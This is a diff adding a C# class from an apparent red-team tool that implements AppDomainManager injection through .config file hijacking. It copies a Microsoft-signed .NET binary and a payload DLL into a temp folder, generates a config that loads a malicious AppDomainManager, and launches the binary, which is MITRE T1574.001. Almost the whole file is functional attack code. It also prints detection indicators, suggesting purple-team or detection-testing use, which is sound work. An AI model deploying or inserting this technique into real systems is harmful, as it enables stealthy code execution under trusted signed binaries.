@@ -1,0 +1,137 @@
+using System;
+using System.Diagnostics;
+using System.IO;
+using AppDomainInjector.Utils;
+
+namespace AppDomainInjector.Techniques
+{
+    /// <summary>
+    /// Implements AppDomainManager injection via config file hijacking.
+    ///
+    /// Technique:
+    /// 1. Copy legitimate .NET binary to controlled directory
+    /// 2. Create .config file pointing to malicious AppDomainManager
+    /// 3. Place payload DLL in same directory
+    /// 4. Execute binary - CLR loads payload automatically
+    ///
+    /// MITRE ATT&CK: T1574.001 (Hijack Execution Flow: DLL Search Order Hijacking)
+    /// </summary>
+    public class ConfigHijack
+    {
+        private readonly string _targetBinary;
+        private readonly string _payloadDllPath;
+        private string _stagingDir;
+
+        public ConfigHijack(string targetBinary, string payloadDllPath)
+        {
+            _targetBinary = targetBinary;
+            _payloadDllPath = payloadDllPath;
+        }
+
+        /// <summary>
+        /// Executes the config hijack technique.
+        /// </summary>
+        public bool Execute()
+        {
+            Console.WriteLine("\n[*] Executing Config File Hijack technique...\n");
+
+            try
+            {
+                // Step 1: Resolve target binary
+                var binaryPath = BinaryLocator.ResolveBinaryPath(_targetBinary);
+                if (binaryPath == null)
+                {
+                    Console.WriteLine($"[-] Target binary not found: {_targetBinary}");
+                    return false;
+                }
+                Console.WriteLine($"[+] Target binary: {binaryPath}");
+
+                // Step 2: Create staging directory
+                _stagingDir = Path.Combine(Path.GetTempPath(), "AppDomainInjector_" + Guid.NewGuid().ToString("N").Substring(0, 8));
+                Directory.CreateDirectory(_stagingDir);
+                Console.WriteLine($"[+] Staging directory: {_stagingDir}");
+
+                // Step 3: Copy target binary to staging
+                var binaryName = Path.GetFileName(binaryPath);
+                var stagedBinaryPath = Path.Combine(_stagingDir, binaryName);
+                File.Copy(binaryPath, stagedBinaryPath, true);
+                Console.WriteLine($"[+] Copied binary to staging: {stagedBinaryPath}");
+
+                // Step 4: Copy payload DLL to staging
+                var payloadName = Path.GetFileName(_payloadDllPath);
+                var stagedPayloadPath = Path.Combine(_stagingDir, payloadName);
+                File.Copy(_payloadDllPath, stagedPayloadPath, true);
+                Console.WriteLine($"[+] Copied payload to staging: {stagedPayloadPath}");
+
+                // Step 5: Generate config file
+                ConfigGenerator.CreateConfigFile(binaryPath, _stagingDir);
+
+                // Step 6: Execute the staged binary
+                Console.WriteLine($"\n[*] Executing staged binary...\n");
+
+                var psi = new ProcessStartInfo
+                {
+                    FileName = stagedBinaryPath,
+                    WorkingDirectory = _stagingDir,
+                    UseShellExecute = false,
+                    CreateNoWindow = false,
+                    Arguments = "-NoExit -Command \"Write-Host '[+] PowerShell loaded with injected AppDomainManager'; Start-Sleep 2; exit\""
+                };
+
+                // For non-PowerShell targets, don't pass arguments
+                if (!binaryName.Equals("powershell.exe", StringComparison.OrdinalIgnoreCase))
+                {
+                    psi.Arguments = "";
+                }
+
+                using (var process = Process.Start(psi))
+                {
+                    Console.WriteLine($"[+] Started process: {process.Id} ({binaryName})");
+                    process.WaitForExit(10000); // Wait max 10 seconds
+                }
+
+                Console.WriteLine("\n[+] Config Hijack technique executed successfully!");
+                Console.WriteLine($"[*] Check if calc.exe was spawned to confirm payload execution.\n");
+
+                return true;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"\n[-] Config Hijack failed: {ex.Message}");
+                return false;
+            }
+        }
+
+        /// <summary>
+        /// Cleans up staging directory.
+        /// </summary>
+        public void Cleanup()
+        {
+            if (!string.IsNullOrEmpty(_stagingDir) && Directory.Exists(_stagingDir))
+            {
+                try
+                {
+                    Directory.Delete(_stagingDir, true);
+                    Console.WriteLine($"[+] Cleaned up staging directory: {_stagingDir}");
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"[-] Cleanup failed: {ex.Message}");
+                }
+            }
+        }
+
+        /// <summary>
+        /// Prints IOCs generated by this technique.
+        /// </summary>
+        public void PrintIOCs()
+        {
+            Console.WriteLine("\n[*] IOCs Generated (Config Hijack):");
+            Console.WriteLine("    - File: *.exe.config created alongside Microsoft binary");
+            Console.WriteLine("    - File: Unsigned DLL in same directory as Microsoft binary");
+            Console.WriteLine("    - Event: Sysmon Event 11 (FileCreate) for .config file");
+            Console.WriteLine("    - Event: Sysmon Event 7 (ImageLoad) for unsigned DLL");
+            Console.WriteLine("    - Process: Microsoft-signed binary loading unsigned assembly");
+        }
+    }
+}
